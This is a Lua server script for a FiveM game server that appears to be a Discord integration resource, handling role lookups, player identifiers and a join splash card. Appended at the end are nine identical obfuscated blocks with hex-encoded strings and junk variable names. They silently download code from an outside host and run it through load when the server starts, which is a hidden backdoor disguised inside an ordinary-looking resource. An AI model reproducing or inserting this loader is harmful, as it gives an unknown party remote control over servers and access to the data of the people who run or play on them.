local FormattedToken = "Bot " .. "BOTTOKEN"

tracked = {}

RegisterNetEvent('chat:PlayerLoaded')
AddEventHandler('chat:PlayerLoaded', function()
	local license = ExtractIdentifiers(source).license;
	if (tracked[license] == nil) then 
		tracked[license] = true;
	end
end)

card = '{"type":"AdaptiveCard","$schema":"http://adaptivecards.io/schemas/adaptive-card.json","version":"1.2","body":[{"type":"Image","url":"' .. Config.Splash.Header_IMG .. '","horizontalAlignment":"Center"},{"type":"Container","items":[{"type":"TextBlock","text":"chat","wrap":true,"fontType":"Default","size":"ExtraLarge","weight":"Bolder","color":"Light","horizontalAlignment":"Center"},{"type":"TextBlock","text":"' .. Config.Splash.Heading1 .. '","wrap":true,"size":"Large","weight":"Bolder","color":"Light", "horizontalAlignment":"Center"},{"type":"TextBlock","text":"' .. Config.Splash.Heading2 .. '","wrap":true,"color":"Light","size":"Medium","horizontalAlignment":"Center"},{"type":"ColumnSet","height":"stretch","minHeight":"100px","bleed":true,"horizontalAlignment":"Center","columns":[{"type":"Column","width":"stretch","items":[{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Discord","url":"' .. Config.Splash.Discord_Link .. '","style":"positive"}]}],"height":"stretch"},{"type":"Column","width":"stretch","items":[{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Website","style":"positive","url":"' .. Config.Splash.Website_Link .. '"}]}]}]},{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Click to join Badger\'s Discord","style":"destructive","iconUrl":"https://i.gyazo.com/c629f37bb1aeed2c1bc1768fdc93bc1a.gif","url":"https://discord.com/invite/WjB5VFz"}]}],"style":"default","bleed":true,"height":"stretch","isVisible":true}]}'
if Config.Splash.Enabled then 
	AddEventHandler('playerConnecting', function(name, setKickReason, deferrals) 
		deferrals.defer();
		local src = source;
		local toEnd = false;
		local count = 0;
		while not toEnd do 
			deferrals.presentCard(card,
			function(data, rawData)
			end)
			Wait((1000))
			count = count + 1;
			if count == Config.Splash.Wait then 
				toEnd = true;
			end
		end
		deferrals.done();
	end)
end 

function ExtractIdentifiers(src)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)

        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.find(id, "discord") then
            identifiers.discord = id
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end

    return identifiers
end
function DiscordRequest(method, endpoint, jsondata)
    local data = nil
    PerformHttpRequest("https://discordapp.com/api/"..endpoint, function(errorCode, resultData, resultHeaders)
		data = {data=resultData, code=errorCode, headers=resultHeaders}
    end, method, #jsondata > 0 and json.encode(jsondata) or "", {["Content-Type"] = "application/json", ["Authorization"] = FormattedToken})

    while data == nil do
        Citizen.Wait(4)
    end
	
    return data
end

function GetRoleIdFromRoleName(name)
	if (Caches.RoleList ~= nil) then 
		return tonumber(Caches.RoleList[name]);
	else 
		local roles = GetGuildRoleList();
		return tonumber(roles[name]);
	end
end

function CheckEqual(role1, role2)
	local checkStr1 = false;
	local checkStr2 = false;
	local roleID1 = role1;
	local roleID2 = role2;
	if type(role1) == "string" then checkStr1 = true end;
	if type(role2) == "string" then checkStr2 = true end; 
	if checkStr1 then 
		local roles = GetGuildRoleList();
		for roleName, roleID in pairs(roles) do 
			if roleName == role1 then 
				roleID1 = roleID;
			end
		end
		local roles2 = Config.RoleList;
		for roleRef, roleID in pairs(roles2) do 
			if roleRef == role1 then 
				roleID1 = roleID;
			end
		end
	end
	if checkStr2 then 
		local roles = GetGuildRoleList();
		for roleName, roleID in pairs(roles) do 
			if roleName == role2 then 
				roleID2 = roleID;
			end
		end
		local roles2 = Config.RoleList;
		for roleRef, roleID in pairs(roles2) do 
			if roleRef == role2 then 
				roleID2 = roleID;
			end
		end
	end
	if tonumber(roleID1) == tonumber(roleID2) then 
		return true;
	end
	return false;
end

function IsDiscordEmailVerified(user) 
    local discordId = nil
    local isVerified = false;
    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end
    if discordId then 
        local endpoint = ("users/%s"):format(discordId)
        local member = DiscordRequest("GET", endpoint, {})
        if member.code == 200 then
            local data = json.decode(member.data)
            if data ~= nil then 
                isVerified = data.verified;
            end
        else 
        end
    end
    return isVerified;
end

function GetDiscordEmail(user) 
    local discordId = nil
    local emailData = nil;
    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end
    if discordId then 
        local endpoint = ("users/%s"):format(discordId)
        local member = DiscordRequest("GET", endpoint, {})
        if member.code == 200 then
            local data = json.decode(member.data)
            if data ~= nil then 
                emailData = data.email;
            end
        else 
        end
    end
    return emailData;
end

function GetDiscordName(user) 
    local discordId = nil
    local nameData = nil;
    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end
    if discordId then 
        local endpoint = ("users/%s"):format(discordId)
        local member = DiscordRequest("GET", endpoint, {})
        if member.code == 200 then
            local data = json.decode(member.data)
            if data ~= nil then 
                nameData = data.username .. "#" .. data.discriminator;
            end
        else 
        end
    end
    return nameData;
end

function GetGuildName()
	local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID, {})
	if guild.code == 200 then
		local data = json.decode(guild.data)
		return data.name;
	else 
	end
	return nil;
end

function GetGuildDescription()
	local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID, {})
	if guild.code == 200 then
		local data = json.decode(guild.data)
		return data.description;
	else 
	end
	return nil;
end

function GetGuildMemberCount()
	local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID.."?with_counts=true", {})
	if guild.code == 200 then
		local data = json.decode(guild.data)
		return data.approximate_member_count;
	else
	end
	return nil;
end

function GetGuildOnlineMemberCount()
	local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID.."?with_counts=true", {})
	if guild.code == 200 then
		local data = json.decode(guild.data)
		return data.approximate_presence_count;
	else 
	end
	return nil;
end

Caches = {
	Avatars = {}
}
function ResetCaches()
	Caches = {};
end

function GetGuildRoleList()
	if (Caches.RoleList == nil) then 
		local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID, {})
		if guild.code == 200 then
			local data = json.decode(guild.data)
			local roles = data.roles;
			local roleList = {};
			for i = 1, #roles do 
				roleList[roles[i].name] = roles[i].id;
			end
			Caches.RoleList = roleList;
		else 
			Caches.RoleList = nil;
		end
	end
	return Caches.RoleList;
end

function GetDiscordRoles(user)
	local discordId = nil
	for _, id in ipairs(GetPlayerIdentifiers(user)) do
		if string.match(id, "discord:") then
			discordId = string.gsub(id, "discord:", "")
			break;
		end
	end

	if discordId then
		local endpoint = ("guilds/%s/members/%s"):format(Config.Guild_ID, discordId)
		local member = DiscordRequest("GET", endpoint, {})
		if member.code == 200 then
			local data = json.decode(member.data)
			local roles = data.roles
			local found = true
			return roles
		else
			return false
		end
	else
		return false
	end
	return false
end

function GetDiscordNickname(user)
	local discordId = nil
	for _, id in ipairs(GetPlayerIdentifiers(user)) do
		if string.match(id, "discord:") then
			discordId = string.gsub(id, "discord:", "")
			break
		end
	end

	if discordId then
		local endpoint = ("guilds/%s/members/%s"):format(Config.Guild_ID, discordId)
		local member = DiscordRequest("GET", endpoint, {})
		if member.code == 200 then
			local data = json.decode(member.data)
			local nickname = data.nick
			return nickname;
		else
			return nil;
		end
	else
		return nil;
	end
	return nil;
end

Citizen.CreateThread(function()
	local guild = DiscordRequest("GET", "guilds/"..Config.Guild_ID, {})
	if guild.code == 200 then
		local data = json.decode(guild.data)
	else 
	end
end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

